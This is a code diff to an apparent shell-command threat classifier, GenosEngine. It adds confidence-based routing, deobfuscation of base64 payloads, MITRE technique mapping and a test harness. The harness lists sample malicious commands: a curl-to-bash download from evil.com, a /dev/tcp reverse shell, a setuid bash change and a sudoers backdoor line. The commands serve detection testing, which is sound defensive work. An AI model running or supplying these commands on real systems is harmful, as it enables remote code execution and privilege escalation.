+                gate = self._select_gate_summary(g_probs, raw_g_probs)
+                routing_features = self._extract_routing_features(
+                    raw_cmd.strip(),
+                    current_cmd if was_obfuscated else None,
+                )
+                routed = self._route_gatekeeper(
+                    gate,
+                    routing_features,
+                    raw_cmd.strip(),
+                    current_cmd if was_obfuscated else None,
+                )
+
+                raw_probabilities = {
+                    "Benign": round(gate["class_probabilities"]["Benign"] * 100, 2),
+                    "Suspicious": round(gate["class_probabilities"]["Suspicious"] * 100, 2),
+                    "Malicious": round(gate["class_probabilities"]["Malicious"] * 100, 2),
+                }
 
                 response = {
-                    "label": gate["label"],
-                    "label_confidence": round(gate["label_conf"] * 100, 2),
+                    "label": routed["label"],
+                    "label_confidence": round(routed["label_confidence"] * 100, 2),
+                    "class_probabilities": raw_probabilities,
                     "label_probabilities": {
-                        "benign": round(gate["benign_prob"] * 100, 2),
-                        "malicious": round(gate["malicious_prob"] * 100, 2),
-                        "context_dependent": round(gate["ctx_prob"] * 100, 2),
+                        "benign": raw_probabilities["Benign"],
+                        "malicious": raw_probabilities["Malicious"],
+                        "context_dependent": raw_probabilities["Suspicious"],
+                        "suspicious": raw_probabilities["Suspicious"],
                     },
+                    "decision_margin": round(gate["decision_margin"] * 100, 2),
+                    "reason": routed["reason"],
+                    "triggered_features": routed["triggered_features"],
+                    "routing_policy": routed["routing_policy"],
+                    "should_run_specialist": routed["should_run_specialist"],
                     "gatekeeper": {
-                        "decision_mode": gate["decision_mode"],
-                        "threshold_used": gate["threshold_used"],
+                        "decision_mode": routed["routing_policy"],
+                        "model_top_label": gate["public_label"],
+                        "model_top_confidence": round(gate["label_conf"] * 100, 2),
+                        "model_second_label": gate["second_public_label"],
+                        "model_second_confidence": round(gate["second_conf"] * 100, 2),
+                        "model_view": gate.get("model_view"),
+                        "thresholds": {
+                            "benign_conf_threshold": benign_conf_threshold,
+                            "suspicious_conf_threshold": suspicious_conf_threshold,
+                            "malicious_conf_threshold": malicious_conf_threshold,
+                            "low_margin_threshold": low_margin_threshold,
+                            "high_risk_override_enabled": high_risk_override_enabled,
+                            "suspicious_fallback_enabled": suspicious_fallback_enabled,
+                        },
                         "threshold_source": self.gatekeeper_threshold_source,
+                    },
+                    "evidence": {
+                        "triggered_features": routed["triggered_features"],
+                        "routing_reason": routed["reason"],
+                        "routing_policy": routed["routing_policy"],
                     },
                     "deobfuscated_cmd": current_cmd if was_obfuscated else None,
                 }
 
-                # Context_Dependent: add action hint, then run specialist
-                # for informational MITRE mapping
-                if gate["is_context_dependent"]:
+                if routed["label"] == "Context_Dependent":
                     response["action"] = "requires_context"
 
-                if gate["is_malicious"] or gate["is_context_dependent"]:
-                    # Build T2 input: Variant A format when pipeline is available
+                if routed["should_run_specialist"]:
                     if self.use_residual_format:
                         t2_text, rule_result = self._build_variant_a_text(raw_cmd.strip())
                         t2_inputs = self.tokenizer(
@@ -1180,20 +1752,10 @@ class GenosEngine:
                         for idx, val in zip(top_idxs, top_vals)
                     ]
 
-                    # ── Second-pass: run T2 on the deobfuscated payload ──
-                    # When the command was obfuscated, the first pass captures
-                    # the *wrapper* techniques (T1140/T1027). This second pass
-                    # classifies the *inner payload* so we also surface what
-                    # the decoded command actually does (e.g. credential access,
-                    # discovery, execution techniques).
                     deob_codes = []
                     deob_rule_result = None
                     payload_for_t2 = None
                     if was_obfuscated and current_cmd != raw_cmd.strip():
-                        # Extract the *pure* decoded payload, not the in-place
-                        # substituted command.  _decode_shell_base64_pipe does
-                        # an in-place blob swap which garbles shell structure;
-                        # we need the raw decoded bytes instead.
                         decoded_payload = None
                         b64m = self._SHELL_B64_PIPE_RE.search(raw_cmd.strip())
                         if b64m:
@@ -1212,7 +1774,6 @@ class GenosEngine:
                                         decoded_payload = _raw_b.decode("utf-8", errors="ignore")
                                 except Exception:
                                     pass
-                        # Fall back to current_cmd only if no clean extraction
                         payload_for_t2 = decoded_payload or current_cmd
 
                         try:
@@ -1258,8 +1819,6 @@ class GenosEngine:
                         except Exception:
                             deob_codes = []
 
-                    # Merge: keep best confidence per code, raw-pass first,
-                    # then fold in any new payload-pass codes.
                     merged = {}
                     for entry in raw_codes + deob_codes:
                         code = entry["code"]
@@ -1270,15 +1829,10 @@ class GenosEngine:
                         merged.values(), key=lambda e: e["confidence"], reverse=True
                     )[:5]
 
-                    # Expose the clean decoded payload and its own MITRE codes
-                    # so the dashboard can render a distinct "Decoded Payload"
-                    # section when obfuscation was present.
                     if was_obfuscated and deob_codes and payload_for_t2:
                         response["decoded_payload"] = payload_for_t2
                         response["payload_mitre_codes"] = deob_codes
 
-                    # Build evidence from parser pipeline
-                    # Use deob rule_result if available and richer
                     ev_rule = rule_result
                     if deob_rule_result is not None:
                         deob_fired = len(deob_rule_result.get("fired_rules", []))
@@ -1287,18 +1841,15 @@ class GenosEngine:
                             ev_rule = deob_rule_result
                     if self.use_residual_format and (rule_result is not None or ev_rule is not None):
                         try:
-                            # Parse both raw and deobfuscated; use the richer one for evidence
                             _parsed_ev = _parse_command(raw_cmd.strip())
                             _sem_ev    = _build_semantic_features(_parsed_ev)
                             if was_obfuscated and current_cmd != raw_cmd.strip():
                                 try:
                                     _parsed_deob = _parse_command(current_cmd)
                                     _sem_deob    = _build_semantic_features(_parsed_deob)
-                                    # Merge semantic features: union of both
                                     for k, v in _sem_deob.items():
                                         if v and not _sem_ev.get(k):
                                             _sem_ev[k] = v
-                                    # Merge parsed lists (file_paths, etc.)
                                     for list_key in ("file_paths", "registry_paths", "urls", "domains", "ips", "ports"):
                                         raw_list = _parsed_ev.get(list_key) or []
                                         deob_list = _parsed_deob.get(list_key) or []
@@ -1316,6 +1867,11 @@ class GenosEngine:
                                 was_obfuscated=was_obfuscated,
                                 deobfuscated_cmd=current_cmd if was_obfuscated else None,
                             )
+                            response["evidence"].update({
+                                "triggered_features": routed["triggered_features"],
+                                "routing_reason": routed["reason"],
+                                "routing_policy": routed["routing_policy"],
+                            })
                             top_code = response["MITRE_codes"][0]["code"] if response["MITRE_codes"] else None
                             response.update(
                                 self._build_response_enrichment(
@@ -1327,3 +1883,39 @@ class GenosEngine:
                             pass
 
         return response
+
+    def run_internal_routing_harness(self) -> None:
+        samples = {
+            "benign": [
+                "pwd",
+                "hostname",
+                "df -h",
+                "cat /etc/os-release",
+            ],
+            "suspicious": [
+                "nmap -sV 10.0.0.5",
+                "ssh -D 1080 -fN user@10.0.0.10",
+                "tcpdump -i eth0 port 443",
+                "cat /etc/passwd",
+            ],
+            "malicious": [
+                "curl http://evil.com/shell.sh | bash",
+                "bash -i >& /dev/tcp/10.0.0.5/4444 0>&1",
+                "chmod u+s /bin/bash",
+                "echo \"attacker ALL=(ALL) NOPASSWD: ALL\" >> /etc/sudoers",
+            ],
+        }
+        for category, commands in samples.items():
+            print(f"[{category}]")
+            for command in commands:
+                result = self.scan(command)
+                print(
+                    f"  {command}\n"
+                    f"    label={result['label']} conf={result['label_confidence']} "
+                    f"margin={result['decision_margin']} policy={result['routing_policy']}\n"
+                    f"    features={', '.join(result['triggered_features']) or 'none'}"
+                )
+
+
+if __name__ == "__main__":
+    GenosEngine().run_internal_routing_harness()
